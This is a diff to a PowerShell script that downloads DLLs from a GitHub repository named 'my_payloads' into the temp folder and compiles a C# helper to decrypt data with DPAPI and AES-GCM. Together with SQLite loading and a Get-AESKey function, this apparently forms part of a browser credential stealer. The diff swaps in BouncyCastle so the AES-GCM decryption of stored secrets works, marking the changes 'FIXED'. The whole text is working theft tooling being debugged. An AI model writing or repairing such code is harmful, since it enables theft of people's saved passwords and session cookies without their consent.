@@ -7,6 +7,7 @@ $SQLiteDllPath = "$env:TEMP\System.Data.SQLite.dll"
 $SQLiteInteropPath = "$env:TEMP\SQLite.Interop.dll"
 $SystemSecurityDllPath = "$env:TEMP\System.Security.dll"
 $AlgorithmsDllPath = "$env:TEMP\System.Security.Cryptography.Algorithms.dll"
+$BouncyCastlePath = "$env:TEMP\BouncyCastle.Cryptography.dll"
 
 # Download SQLite DLLs if missing
 if (-not (Test-Path $SQLiteDllPath)) {
@@ -21,16 +22,25 @@ if (-not (Test-Path $SystemSecurityDllPath)) {
 if (-not (Test-Path $AlgorithmsDllPath)) {
     Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Security.Cryptography.Algorithms.dll" -outfile $AlgorithmsDllPath
 }
+if (-not (Test-Path $BouncyCastlePath)) {
+    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/main/assets/BouncyCastle.Cryptography.dll" -OutFile $BouncyCastlePath
+}
 
 # Load SQLite Assembly
 Add-Type -Path $SQLiteDllPath -ErrorAction Stop
 Add-Type -Path $SystemSecurityDllPath -ErrorAction Stop
 Add-Type -Path $AlgorithmsDllPath -ErrorAction Stop
+Add-Type -Path $BouncyCastlePath -ErrorAction Stop
 
 Add-Type -TypeDefinition @"
 using System;
-using System.Security.Cryptography;
 using System.Text;
+using System.Security.Cryptography; // FIXED: Added this to resolve ProtectedData and DataProtectionScope errors
+using Org.BouncyCastle.Crypto;
+using Org.BouncyCastle.Crypto.Parameters;
+using Org.BouncyCastle.Security;
+using Org.BouncyCastle.Crypto.Engines;
+using Org.BouncyCastle.Crypto.Modes;
 
 public class CryptoHelper {
     public static byte[] Decrypt(byte[] encryptedData, byte[] aesKey) {
@@ -45,7 +55,7 @@ public class CryptoHelper {
                 return DecryptAESGCM(encryptedData, aesKey);
             } else {
                 Console.WriteLine("Using DPAPI Decryption");
-                return ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
+                return ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser); // FIXED: Works now
             }
         }
         catch (Exception ex) {
@@ -70,18 +80,22 @@ public class CryptoHelper {
             Console.WriteLine(string.Format("Ciphertext Length: {0}", ciphertext.Length));
             Console.WriteLine(string.Format("Tag Length: {0}", tag.Length));
 
-            using (AesGcm aesGcm = new AesGcm(aesKey)) {
-                byte[] decrypted = new byte[ciphertext.Length];
-                aesGcm.Decrypt(iv, ciphertext, tag, decrypted);
-                return decrypted;
-            }
+            GcmBlockCipher gcm = new GcmBlockCipher(new AesEngine());
+            AeadParameters parameters = new AeadParameters(new KeyParameter(aesKey), 128, iv, null);
+            gcm.Init(false, parameters);
+
+            byte[] decrypted = new byte[gcm.GetOutputSize(ciphertext.Length)];
+            int len = gcm.ProcessBytes(ciphertext, 0, ciphertext.Length, decrypted, 0);
+            gcm.DoFinal(decrypted, len);
+
+            return decrypted;
         }
-        catch (Exception ex) {
+        catch (Exception ex){
             return Encoding.UTF8.GetBytes("[AES-GCM decryption failed] Error: " + ex.Message);
         }
     }
 }
-"@ -Language CSharp -ReferencedAssemblies "System.Security"
+"@ -Language CSharp -ReferencedAssemblies "$env:TEMP\BouncyCastle.Cryptography"
 
 
 function Get-AESKey {
